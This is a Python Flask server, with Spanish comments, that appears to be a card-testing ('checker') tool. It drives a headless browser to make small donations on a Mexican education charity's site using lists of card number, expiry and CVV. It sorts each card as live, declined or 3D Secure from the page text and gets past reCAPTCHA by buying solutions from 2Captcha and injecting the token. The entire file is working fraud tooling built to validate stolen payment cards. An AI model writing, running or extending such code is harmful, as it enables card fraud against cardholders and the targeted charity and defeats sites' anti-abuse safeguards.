from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import re
import threading
import time
from datetime import datetime
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
import requests
import logging
from datetime import datetime
import base64 
from twocaptcha import TwoCaptcha

# Configuración de logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# Variables de entorno de Northflank
HEADLESS = os.environ.get('HEADLESS', 'true').lower() == 'true'
API_KEY_2CAPTCHA = os.environ.get('API_KEY_2CAPTCHA', '')
EDUPAM_DONOR_NAME = os.environ.get('EDUPAM_DONOR_NAME', 'Juan')
EDUPAM_DONOR_LASTNAME = os.environ.get('EDUPAM_DONOR_LASTNAME', 'Perez')
EDUPAM_DONOR_EMAIL = os.environ.get('EDUPAM_DONOR_EMAIL', 'juan.perez@example.com')
EDUPAM_BASE_URL = os.environ.get('EDUPAM_BASE_URL', 'https://www.edupam.org')
EDUPAM_ENDPOINT = os.environ.get('EDUPAM_ENDPOINT', '/mx/dona/')
DONATION_AMOUNT = int(os.environ.get('DONATION_AMOUNT', '50'))
MAX_WORKERS = int(os.environ.get('MAX_WORKERS', '5'))

# Variables globales de estado
checking_status = {
    'active': False,
    'processed': 0,
    'live': 0,
    'decline': 0,
    'threeds': 0,
    'error': 0,
    'current': '',
    'results': [],
    'thread': None,
    'stop_on_live': False
}




class CaptchaSolver:
    """Clase para resolver captchas usando API de 2Captcha"""
    
    def __init__(self, api_key):
        self.api_key = api_key
        self.base_url = "https://2captcha.com"
        
    def solve_recaptcha_v2(self, site_key, page_url):
        """Resolver reCAPTCHA v2 usando la API de 2Captcha"""
        try:
            if not self.api_key:
                logger.warning("⚠️ API key de 2Captcha no configurada")
                return None
            
            # Enviar captcha a 2Captcha
            params = {
                'key': self.api_key,
                'method': 'userrecaptcha',
                'googlekey': site_key,
                'pageurl': page_url,
                'json': 1,
                'invisible': 0  # Captcha visible, NO invisible
            }
            
            logger.info(f"🔄 Enviando reCAPTCHA v2 a 2Captcha...")
            logger.info(f"📊 Site key: {site_key[:20]}...")
            logger.info(f"🌐 URL: {page_url}")
            
            response = requests.post(f"{self.base_url}/in.php", data=params, timeout=30)
            result = response.json()
            
            if result.get('status') != 1:
                error = result.get('error_text', 'Error desconocido')
                logger.error(f"❌ Error 2Captcha: {error}")
                return None
            
            captcha_id = result['request']
            logger.info(f"✅ Captcha enviado. ID: {captcha_id}")
            
            # Esperar solución (hasta 2 minutos)
            for i in range(30):  # 30 * 4 = 120 segundos
                time.sleep(4)  # Esperar 4 segundos entre intentos
                
                params = {
                    'key': self.api_key,
                    'action': 'get',
                    'id': captcha_id,
                    'json': 1
                }
                
                response = requests.get(f"{self.base_url}/res.php", params=params, timeout=30)
                result = response.json()
                
                if result.get('status') == 1:
                    solution = result['request']
                    logger.info(f"✅ Captcha resuelto en {(i+1)*4} segundos")
                    logger.info(f"📦 Solución (primeros 30 chars): {solution[:30]}...")
                    return solution
                elif result.get('request') == 'CAPCHA_NOT_READY':
                    if (i+1) % 5 == 0:  # Log cada 20 segundos
                        logger.info(f"⏳ Captcha no listo... {i+1}/30 intentos")
                    continue
                else:
                    error = result.get('error_text', 'Error desconocido')
                    logger.error(f"❌ Error al resolver captcha: {error}")
                    return None
            
            logger.error("❌ Tiempo de espera agotado para captcha (2 minutos)")
            return None
            
        except Exception as e:
            logger.error(f"❌ Error en solve_recaptcha_v2: {e}")
            return None     




class PaymentAnalyzer:
    """Analizador de respuestas de pagos para Edupam"""
    
    @staticmethod
    def analyze_payment_result(page, current_url, card_last4):
        """Versión mejorada con lógica más precisa"""
        evidence = []
        final_status = 'unknown'
        
        try:
            page_content = page.content()
            page_content_lower = page.content().lower()
            current_url_lower = current_url.lower()
            
            logger.info(f"🔍 ANALIZANDO para ****{card_last4}")
            logger.info(f"🔍 URL: {current_url}")
            
            # DEBUG: Ver contenido relevante
            debug_content = page_content_lower[:500]
            logger.info(f"🔍 CONTENIDO (500 chars): {debug_content}")
            
            # 1. Buscar palabras EXACTAS de DECLINE primero (más específico)
            decline_keywords = [
                'has been declined',
                'rechazada',
                'declined',
                'ocurrió un error',
                'incorrecto',
                'venció',
                'admite',
                'no válida',
                'invalid',
                'error en la transacción',
                'card has been declined'
            ]
            
            for keyword in decline_keywords:
                if keyword in page_content_lower:
                    final_status = 'decline'
                    evidence.append(f'DEAD: "{keyword}" encontrado')
                    logger.info(f"❌ ENCONTRADO '{keyword}' - ES DEAD")
                    break
            
            # 2. Si no es DEAD, buscar LIVE
            if final_status != 'decline':
                if '¡muchas gracias' in page_content_lower or 'muchas gracias' in page_content_lower:
                    final_status = 'live'
                    evidence.append('LIVE: palabra "Muchas gracias" encontradas')
                    logger.info(f"✅ ENCONTRADO 'muchas gracias' - Es LIVE")
                elif 'pago exitoso' in page_content_lower or 'success' in page_content_lower:
                    final_status = 'live'
                    evidence.append('LIVE: palabra de éxito encontrada')
                    logger.info(f"✅ ENCONTRADO palabra de éxito - Es LIVE")
            
            # 3. Solo buscar 3D Secure si no es LIVE ni DEAD
            if final_status == 'unknown':
                # Buscar específicamente en contexto de 3D
                if '3d secure' in page_content_lower or '3-d secure' in page_content_lower:
                    final_status = 'threeds'
                    evidence.append('3DS: "3D Secure" encontrado')
                    logger.info(f"🛡️ ENCONTRADO '3D Secure' - ES 3DS")
                elif 'authentication' in page_content_lower and 'secure' in page_content_lower:
                    final_status = 'threeds'
                    evidence.append('3DS: contexto de autenticación seguro encontrado')
                    logger.info(f"🛡️ ENCONTRADO contexto de autenticación - ES 3DS")
                # Evitar falsos positivos: solo marcar "secure" como 3DS si está en contexto de pago
                elif 'secure' in page_content_lower:
                    # Verificar contexto - no marcar si es parte de "high quality" u otras frases
                    if 'educación de alta calidad' not in page_content_lower:
                        final_status = 'threeds'
                        evidence.append('3DS: palabra "secure" encontrada')
                        logger.info(f"🛡️ ENCONTRADO 'secure' - ES 3DS")
            
            # 4. Si aún es unknown
            if final_status == 'unknown':
                evidence.append('NO se encontraron palabras clave claras')
                logger.info(f"❓ NO se encontraron palabras clave claras")
            
        except Exception as e:
            evidence.append(f'Error: {str(e)}')
            final_status = 'error'
            logger.error(f"❌ Error en análisis: {e}")
        
        return {
            'status': final_status,
            'evidence': evidence,
            'url': current_url
        }


class EdupamChecker:
    def __init__(self, headless=True):
        self.base_url = EDUPAM_BASE_URL
        self.endpoint = EDUPAM_ENDPOINT
        self.headless = headless
        self.donor_data = {
            'nombre': EDUPAM_DONOR_NAME,
            'apellido': EDUPAM_DONOR_LASTNAME,
            'email': EDUPAM_DONOR_EMAIL,
            'fecha_nacimiento': '1990-01-01',
            'tipo': 'one-time',
            'codigo': ''
        }
        self.analyzer = PaymentAnalyzer()
        self.captcha_solver = CaptchaSolver(API_KEY_2CAPTCHA) if API_KEY_2CAPTCHA else None
    
    def parse_card_data(self, card_string):
        """Parsear string de tarjeta en formato: NUMERO|MES|AÑO|CVV"""
        try:
            parts = card_string.strip().split('|')
            if len(parts) != 4:
                raise ValueError("Formato inválido")
            
            return {
                'numero': parts[0].strip().replace(' ', ''),
                'mes': parts[1].strip().zfill(2),
                'ano': parts[2].strip()[-2:],
                'cvv': parts[3].strip()
            }
        except Exception as e:
            logger.error(f"Error parseando tarjeta: {e}")
            return None
    
    def fill_form(self, page, amount):
        """Llenar formulario básico de donación"""
        try:
            # Nombre
            page.fill('#name', self.donor_data['nombre'])
            time.sleep(0.3)
            
            # Apellido
            page.fill('#lastname', self.donor_data['apellido'])
            time.sleep(0.3)
            
            # Email
            page.fill('#email', self.donor_data['email'])
            time.sleep(0.3)
            
            # Fecha de nacimiento
            page.fill('#birthdate', self.donor_data['fecha_nacimiento'])
            time.sleep(0.3)
            
            # Monto
            page.fill('#quantity', str(amount))
            time.sleep(0.5)
            
            return True
        except Exception as e:
            logger.error(f"Error llenando formulario: {e}")
            return False
    
    def fill_card_simple(self, page, card_info):
        """Llenar datos de tarjeta usando método TAB"""
        try:
            # Hacer clic en el campo de monto para asegurar focus
            page.locator('#quantity').click()
            time.sleep(0.5)
            
            # Presionar TAB para ir al primer campo de tarjeta
            page.keyboard.press('Tab')
            time.sleep(1)
            
            # Escribir número de tarjeta
            page.keyboard.press('Control+A')
            page.keyboard.press('Backspace')
            time.sleep(0.2)
            
            page.keyboard.type(card_info['numero'], delay=50)
            time.sleep(1.5)
            
            # Esperar TAB automático y escribir fecha
            fecha = card_info['mes'] + card_info['ano']
            page.keyboard.type(fecha, delay=50)
            time.sleep(1.5)
            
            # Esperar TAB automático y escribir CVC
            page.keyboard.type(card_info['cvv'], delay=50)
            time.sleep(1)
            
            return True
        except Exception as e:
            logger.error(f"Error llenando tarjeta: {e}")
            return False
    








    def solve_captcha_if_present(self, page, card_last4):
        """Detectar y resolver captcha si está presente"""
        try:
            time.sleep(3)
            
            # 1. Buscar TODOS los iframes en la página
            logger.info("=" * 50)
            logger.info("🔍 DEBUG: Listando TODOS los iframes...")
            iframes = page.frames
            for i, frame in enumerate(iframes):
                try:
                    url = frame.url
                    logger.info(f"Iframe {i}: {url[:100]}")
                except:
                    logger.info(f"Iframe {i}: [no se pudo obtener URL]")
            logger.info("=" * 50)
            
            site_key = None
            captcha_detected = False
            
            # 2. Buscar en cada iframe
            for i, frame in enumerate(iframes):
                try:
                    # Obtener URL del iframe
                    iframe_url = frame.url
                    
                    # Verificar si es un iframe de recaptcha
                    if 'google.com/recaptcha' in iframe_url:
                        logger.info(f"✅ Iframe {i} es de reCAPTCHA: {iframe_url[:50]}...")
                        captcha_detected = True
                        
                        # Extraer site-key de la URL del iframe
                        match = re.search(r'[?&]k=([^&]+)', iframe_url)
                        if match:
                            site_key = match.group(1)
                            logger.info(f"✅ Site-key encontrado en iframe: {site_key[:30]}...")
                            break
                        
                        # También buscar en el contenido del iframe
                        try:
                            # Evaluar dentro del iframe
                            site_key_in_frame = frame.evaluate("""
                                () => {
                                    // Buscar data-sitekey dentro del iframe
                                    const sitekeyEl = document.querySelector('[data-sitekey]');
                                    if (sitekeyEl) {
                                        return sitekeyEl.getAttribute('data-sitekey');
                                    }
                                    return null;
                                }
                            """)
                            
                            if site_key_in_frame:
                                site_key = site_key_in_frame
                                logger.info(f"✅ Site-key encontrado en contenido del iframe: {site_key[:30]}...")
                                break
                        except:
                            continue
                
                except Exception as e:
                    logger.debug(f"⚠️ Error analizando iframe {i}: {e}")
                    continue
            
            # 3. Si no se encontró en iframes, buscar en el documento principal
            if not site_key:
                try:
                    # Buscar site-key en elementos del documento principal
                    selectors = [
                        'div[data-sitekey]',
                        '.g-recaptcha[data-sitekey]',
                        'iframe[src*="recaptcha"][data-sitekey]'
                    ]
                    
                    for selector in selectors:
                        try:
                            if page.locator(selector).count() > 0:
                                site_key = page.locator(selector).first.get_attribute('data-sitekey')
                                if site_key:
                                    logger.info(f"✅ Site-key encontrado en elemento principal: {site_key[:30]}...")
                                    captcha_detected = True
                                    break
                        except:
                            continue
                except Exception as e:
                    logger.warning(f"⚠️ Error buscando en documento principal: {e}")
            
            # 4. Si no hay captcha detectado
            if not captcha_detected:
                logger.info(f"✅ No se detectó captcha para ****{card_last4}")
                return True
            
            # 5. Si hay captcha pero no site-key
            if not site_key:
                logger.error(f"❌ Captcha detectado pero no se pudo obtener site-key para ****{card_last4}")
                # Intentar extraer de cualquier iframe que contenga 'recaptcha' en la URL
                for frame in iframes:
                    try:
                        iframe_url = frame.url
                        if 'recaptcha' in iframe_url.lower():
                            # Extraer k=xxxx de la URL
                            import urllib.parse
                            parsed = urllib.parse.urlparse(iframe_url)
                            params = urllib.parse.parse_qs(parsed.query)
                            if 'k' in params:
                                site_key = params['k'][0]
                                logger.info(f"✅ Site-key extraído de parámetros URL: {site_key[:30]}...")
                                break
                    except:
                        continue
            
            if not site_key:
                logger.error(f"❌ No se pudo obtener site-key después de todos los intentos")
                return False
            
            if not self.captcha_solver:
                logger.error(f"❌ API key de 2Captcha no configurada")
                return False
            
            # 6. Resolver captcha
            logger.info(f"🔄 Resolviendo captcha para ****{card_last4}...")
            page_url = page.url
            solution = self.captcha_solver.solve_recaptcha_v2(site_key, page_url)
            
            if not solution:
                logger.error(f"❌ No se pudo resolver el captcha")
                return False
            
            logger.info(f"✅ Captcha resuelto, solución obtenida")
            
            # 7. Inyectar solución
            try:
                # Método más robusto: usar evaluate con parámetros
                page.evaluate("""
                    (solution) => {
                        console.log('🎯 Intentando inyectar solución de captcha...');
                        
                        // 1. Buscar campo existente
                        let field = document.getElementById('g-recaptcha-response');
                        if (!field) {
                            field = document.querySelector('[name="g-recaptcha-response"]');
                        }
                        
                        // 2. Si no existe, crearlo
                        if (!field) {
                            field = document.createElement('textarea');
                            field.id = 'g-recaptcha-response';
                            field.name = 'g-recaptcha-response';
                            field.style.display = 'none';
                            document.body.appendChild(field);
                            console.log('✅ Campo creado');
                        }
                        
                        // 3. Asignar valor
                        field.value = solution;
                        console.log('✅ Valor asignado');
                        
                        // 4. Disparar eventos
                        const events = ['change', 'input', 'blur'];
                        events.forEach(eventType => {
                            const event = new Event(eventType, { bubbles: true });
                            field.dispatchEvent(event);
                        });
                        
                        console.log('✅ Eventos disparados');
                        
                        // 5. También intentar en iframes
                        const frames = document.querySelectorAll('iframe');
                        frames.forEach(frame => {
                            try {
                                const frameDoc = frame.contentDocument || frame.contentWindow.document;
                                const frameField = frameDoc.getElementById('g-recaptcha-response') || 
                                                frameDoc.querySelector('[name="g-recaptcha-response"]');
                                if (frameField) {
                                    frameField.value = solution;
                                    console.log('✅ También inyectado en iframe');
                                }
                            } catch(e) {
                                // Ignorar errores de cross-origin
                            }
                        });
                        
                        return true;
                    }
                """, solution)
                
                time.sleep(2)
                
                # 8. Re-enviar formulario
                btn = page.locator('#btn-donation')
                if btn.count() > 0:
                    logger.info(f"✅ Re-enviando formulario...")
                    btn.click()
                    time.sleep(5)
                
                return True
                
            except Exception as e:
                logger.error(f"❌ Error inyectando solución: {e}")
                return False
                
        except Exception as e:
            logger.error(f"❌ Error general en solve_captcha_if_present: {e}")
            return False







    
    def check_single_card(self, card_string, amount=50):
        """Verificar una sola tarjeta - CIERRA después de cada una"""
        card_last4 = card_string.split('|')[0][-4:] if '|' in card_string else '????'
        logger.info(f"🚀 INICIANDO NUEVA VERIFICACIÓN para ****{card_last4}")
        
        # Parsear tarjeta
        card_info = self.parse_card_data(card_string)
        if not card_info:
            return {
                'success': False,
                'status': 'error',
                'message': 'Error parseando tarjeta',
                'card': card_last4
            }
        
        playwright = None
        browser = None
        page = None
        
        try:
            logger.info(f"1. Iniciando Playwright FRESCO...")
            playwright = sync_playwright().start()
            
            logger.info(f"2. Lanzando Chromium NUEVO...")
            browser = playwright.chromium.launch(
                executable_path='/usr/bin/chromium',
                headless=True,
                args=['--no-sandbox', '--disable-setuid-sandbox']
            )
            
            logger.info(f"3. Creando contexto NUEVO...")
            context = browser.new_context()
            
            logger.info(f"4. Creando página NUEVA...")
            page = context.new_page()
            
            # Navegar
            logger.info(f"5. Navegando a {self.base_url}{self.endpoint}...")
            page.goto(f"{self.base_url}{self.endpoint}", timeout=30000)
            time.sleep(3)
            
            # Verificar URL
            logger.info(f"6. URL actual: {page.url}")
            
            # Llenar formulario
            logger.info(f"7. Llenando formulario...")
            if not self.fill_form(page, amount):
                return {
                    'success': False,
                    'status': 'ERROR',
                    'message': 'Error llenando formulario',
                    'card': card_last4
                }
            
            # Ingresar tarjeta
            logger.info(f"8. Ingresando tarjeta ****{card_last4}...")
            if not self.fill_card_simple(page, card_info):
                return {
                    'success': False,
                    'status': 'ERROR',
                    'message': 'Error ingresando tarjeta',
                    'card': card_last4
                }
            
            time.sleep(2)
            
            # Enviar
            logger.info(f"9. Enviando donación...")
            btn = page.locator('#btn-donation')
            if btn.count() == 0:
                return {
                    'success': False,
                    'status': 'ERROR',
                    'message': 'Botón no encontrado',
                    'card': card_last4
                }
            
            btn.click()
            
            # Intentar resolver captcha si aparece
            captcha_solved = True
            if self.captcha_solver:
                logger.info(f"10. Verificando captcha para ****{card_last4}...")
                captcha_solved = self.solve_captcha_if_present(page, card_last4)
            
            # Esperar respuesta después del captcha (o sin captcha)
            wait_time = 15 if captcha_solved else 8
            logger.info(f"11. Esperando respuesta ({wait_time} segundos)...")
            time.sleep(wait_time)
            
            # DEBUG EXTREMO
            logger.info(f"12. URL DESPUÉS de enviar: {page.url}")
            page_text = page.content()
            logger.info(f"13. HTML (200 chars): {page_text[:200]}")
            
            # Tomar screenshot ÚNICO para esta tarjeta
            screenshot_b64 = None
            try:
                # 1. Hacer scroll para forzar renderizado de elementos lazy
                page.evaluate("""
                    () => {
                        const height = document.body.scrollHeight;
                        window.scrollTo(0, height);
                        window.scrollTo(0, 0);
                    }
                """)
                
                # 2. Esperar un poco después del scroll
                page.wait_for_timeout(300)
                
                # 3. Obtener altura total REAL (puede haber cambiado después del scroll)
                total_height = page.evaluate("""
                    () => {
                        return Math.max(
                            document.body.scrollHeight,
                            document.documentElement.scrollHeight
                        );
                    }
                """)
                
                # 4. Ajustar viewport si es necesario
                current_viewport = page.viewport_size
                if total_height > current_viewport['height']:
                    page.set_viewport_size({
                        'width': current_viewport['width'],
                        'height': total_height + 50  # Margen extra por seguridad
                    })
                
                # 5. Esperar a que se re-renderice con el nuevo tamaño
                page.wait_for_timeout(1000)
                
                # 6. Tomar screenshot
                screenshot_bytes = page.screenshot(full_page=True)
                screenshot_b64 = base64.b64encode(screenshot_bytes).decode('utf-8')
                logger.info(f"14. 📸 Screenshot ÚNICO tomado para ****{card_last4}")
                
            except Exception as e:
                logger.error(f"Error screenshot: {e}")
            
            # Analizar
            current_url = page.url
            analysis = self.analyzer.analyze_payment_result(
                page, current_url, card_last4
            )
            
            # Resultado
            status_map = {'live': 'LIVE', 'decline': 'DEAD', 'threeds': '3DS', 'unknown': 'ERROR'}
            final_status = status_map.get(analysis['status'], 'ERROR')
            
            messages = {
                'LIVE': '✅ Tarjeta aprobada - Donación exitosa',
                'DEAD': '❌ Tarjeta declinada - Fondos insuficientes',
                '3DS': '🛡️ 3D Secure requerido - Autenticación necesaria',
                'ERROR': '⚠️ Error desconocido - Verificación manual requerida'
            }
            
            # Añadir información sobre captcha
            evidence = analysis['evidence']
            if not captcha_solved and self.captcha_solver:
                evidence.append('⚠️ No se pudo resolver captcha')
            
            result = {
                'success': True,
                'status': final_status,
                'original_status': messages.get(final_status, 'Estado desconocido'),
                'message': ', '.join(evidence),
                'response': {
                    'url': analysis['url'],
                    'evidence': analysis['evidence'],
                    'screenshot': screenshot_b64,
                    'timestamp': datetime.now().isoformat(),
                    'captcha_solved': captcha_solved
                },
                'card': f"****{card_last4}",
                'gate': 'Edupam',
                'amount': amount
            }
            
            logger.info(f"15. ✅ Verificación COMPLETADA para ****{card_last4}: {final_status}")
            
            # CERRAR TODO
            logger.info(f"16. Cerrando recursos...")
            try:
                page.close()
                context.close()
                browser.close()
                playwright.stop()
                logger.info(f"17. ✅ Recursos CERRADOS para ****{card_last4}")
            except Exception as e:
                logger.error(f"Error cerrando: {e}")
            
            return result
            
        except Exception as e:
            logger.error(f"❌ ERROR en ****{card_last4}: {e}")
            # CERRAR TODO
            try:
                if page and not page.is_closed():
                    page.close()
                if browser:
                    browser.close()
                if playwright:
                    playwright.stop()
            except:
                pass
            
            return {
                'success': False,
                'status': 'ERROR',
                'message': f'Error: {str(e)[:100]}',
                'card': card_last4
            }



# ========== FUNCIONES DEL WORKER ==========

def process_cards_worker(cards, amount, stop_on_live):
    """Worker que procesa las tarjetas"""
    global checking_status
    
    checker = EdupamChecker(headless=HEADLESS)
    
    for i, card_line in enumerate(cards):
        if not checking_status['active']:
            break
        
        try:
            parts = card_line.strip().split('|')
            if len(parts) < 4:
                checking_status['error'] += 1
                checking_status['results'].append({
                    'id': i + 1,
                    'card': 'INVALID',
                    'status': 'ERROR',
                    'message': 'Formato inválido',
                    'timestamp': datetime.now().isoformat()
                })
                continue
            
            card_number = parts[0].strip()
            last4 = card_number[-4:] if len(card_number) >= 4 else '????'
            checking_status['current'] = f"****{last4}"
            
            logger.info(f"Procesando tarjeta {i+1}/{len(cards)}: ****{last4}")
            
            # Verificar tarjeta
            result = checker.check_single_card(card_line, amount)
            
            # Crear resultado
            card_result = {
                'id': i + 1,
                'card': f"****{last4}",
                'full_card': card_line,
                'status': result.get('status', 'ERROR'),
                'original_status': result.get('original_status', ''),
                'message': result.get('message', ''),
                'gate': result.get('gate', 'Edupam'),
                'amount': amount,
                'timestamp': datetime.now().isoformat(),
                'response': result.get('response', {}),
                'success': result.get('success', False)
            }
            
            # Actualizar estadísticas
            checking_status['processed'] += 1
            checking_status['results'].append(card_result)
            
            if result.get('status') == 'LIVE':
                checking_status['live'] += 1
                if stop_on_live:
                    checking_status['active'] = False
                    break
            elif result.get('status') == 'DEAD':
                checking_status['decline'] += 1
            elif result.get('status') == '3DS':
                checking_status['threeds'] += 1
            else:
                checking_status['error'] += 1
            
            # Pequeño delay entre tarjetas
            time.sleep(2)
            
        except Exception as e:
            logger.error(f"Error procesando tarjeta: {e}")
            checking_status['error'] += 1
            checking_status['results'].append({
                'id': i + 1,
                'card': 'ERROR',
                'status': 'ERROR',
                'message': f'Error: {str(e)}',
                'timestamp': datetime.now().isoformat()
            })
            continue
    
    checking_status['active'] = False


# ========== ENDPOINTS API ==========

@app.route('/')
def index():
    """Endpoint raíz del backend"""
    return jsonify({
        "status": "online",
        "service": "Lattice Checker API (Edupam)",
        "version": "2.1",
        "endpoints": {
            "health": "/api/health",
            "status": "/api/status",
            "check_card": "/api/check-card (POST)",
            "check_cards": "/api/check (POST)",
            "results": "/api/results",
            "cancel": "/api/cancel (POST)"
        },
        "config": {
            "headless": HEADLESS,
            "donation_amount": DONATION_AMOUNT,
            "max_workers": MAX_WORKERS,
            "2captcha": "enabled" if API_KEY_2CAPTCHA else "disabled"
        }
    })

@app.route('/api/health', methods=['GET'])
def health_check():
    """Verificar estado del servidor"""
    return jsonify({
        'status': 'online',
        'service': 'Lattice Checker API',
        'version': '2.1',
        'timestamp': datetime.now().isoformat(),
        'features': {
            'captcha_support': bool(API_KEY_2CAPTCHA),
            'screenshots': True,
            'multi_card_check': True
        }
    })

@app.route('/api/status', methods=['GET'])
def get_status():
    """Obtener estado actual del checker"""
    return jsonify({
        'active': checking_status['active'],
        'processed': checking_status['processed'],
        'live': checking_status['live'],
        'decline': checking_status['decline'],
        'threeds': checking_status['threeds'],
        'error': checking_status['error'],
        'current': checking_status['current'],
        'total': len(checking_status['results']),
        'captcha_enabled': bool(API_KEY_2CAPTCHA)
    })

@app.route('/api/check-card', methods=['POST'])
def check_single_card():
    """Verificar una sola tarjeta (para el frontend)"""
    global checking_status
    
    if checking_status['active']:
        return jsonify({
            'success': False,
            'status': 'ERROR',
            'message': 'Ya hay un chequeo en progreso'
        }), 400
    
    data = request.json
    
    # Extraer datos
    card_data = data.get('card', '')
    cookies = data.get('cookies', '')  # Mantener para compatibilidad
    
    if not card_data or '|' not in card_data:
        return jsonify({
            'success': False,
            'status': 'ERROR',
            'message': 'Formato de tarjeta inválido',
            'original_status': '⚠️ Error'
        }), 400
    
    # Parsear tarjeta
    parts = card_data.split('|')
    if len(parts) < 4:
        return jsonify({
            'success': False,
            'status': 'ERROR',
            'message': 'Formato de tarjeta incompleto',
            'original_status': '⚠️ Error'
        }), 400
    
    card_number = parts[0].strip()
    
    # Validar formato básico
    if not card_number.isdigit() or len(card_number) not in [15, 16]:
        return jsonify({
            'success': False,
            'status': 'ERROR',
            'message': 'Número de tarjeta inválido',
            'original_status': '⚠️ Error'
        }), 400
    
    # Verificar tarjeta
    checker = EdupamChecker(headless=HEADLESS)
    result = checker.check_single_card(card_data, DONATION_AMOUNT)
    
    return jsonify(result)

@app.route('/api/check', methods=['POST'])
def check_cards():
    """Iniciar verificación de múltiples tarjetas"""
    global checking_status
    
    if checking_status['active']:
        return jsonify({'error': 'Ya hay un chequeo en progreso'}), 400
    
    data = request.json
    cards = data.get('cards', [])
    amount = data.get('amount', DONATION_AMOUNT)
    stop_on_live = data.get('stop_on_live', False)
    
    if not cards:
        return jsonify({'error': 'No hay tarjetas para verificar'}), 400
    
    # Filtrar tarjetas válidas
    valid_cards = []
    for card in cards:
        if '|' in card and len(card.split('|')) >= 4:
            valid_cards.append(card)
    
    if not valid_cards:
        return jsonify({'error': 'No hay tarjetas válidas'}), 400
    
    # Inicializar estado
    checking_status = {
        'active': True,
        'processed': 0,
        'live': 0,
        'decline': 0,
        'threeds': 0,
        'error': 0,
        'current': '',
        'results': [],
        'thread': None,
        'stop_on_live': stop_on_live
    }
    
    # Iniciar thread de verificación
    thread = threading.Thread(
        target=process_cards_worker,
        args=(valid_cards, amount, stop_on_live)
    )
    thread.daemon = True
    thread.start()
    checking_status['thread'] = thread
    
    return jsonify({
        'success': True,
        'message': f'Verificación iniciada para {len(valid_cards)} tarjetas',
        'total': len(valid_cards),
        'amount': amount,
        'captcha_enabled': bool(API_KEY_2CAPTCHA)
    })

@app.route('/api/results', methods=['GET'])
def get_results():
    """Obtener resultados del chequeo"""
    return jsonify({
        'results': checking_status['results'][-100:],
        'stats': {
            'total': len(checking_status['results']),
            'live': checking_status['live'],
            'decline': checking_status['decline'],
            'threeds': checking_status['threeds'],
            'error': checking_status['error']
        },
        'captcha_enabled': bool(API_KEY_2CAPTCHA)
    })

@app.route('/api/cancel', methods=['POST'])
def cancel_check():
    """Cancelar chequeo en curso"""
    global checking_status
    checking_status['active'] = False
    return jsonify({'success': True, 'message': 'Chequeo cancelado'})

# ========== INICIALIZACIÓN ==========

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    debug = os.environ.get('FLASK_ENV', 'production') == 'development'
    
    logger.info(f"🚀 Server starting on port {port}")
    logger.info(f"🔧 Config:")
    logger.info(f"   Headless: {HEADLESS}")
    logger.info(f"   Donation amount: ${DONATION_AMOUNT}")
    logger.info(f"   Max workers: {MAX_WORKERS}")
    logger.info(f"   2Captcha: {'ENABLED' if API_KEY_2CAPTCHA else 'DISABLED'}")
    
    if API_KEY_2CAPTCHA:
        logger.info(f"   Captcha Solver: ✅ Integrado y listo")
    else:
        logger.warning(f"   Captcha Solver: ⚠️ NO configurado - Los captchas no se resolverán")
    
    app.run(host='0.0.0.0', port=port, debug=debug)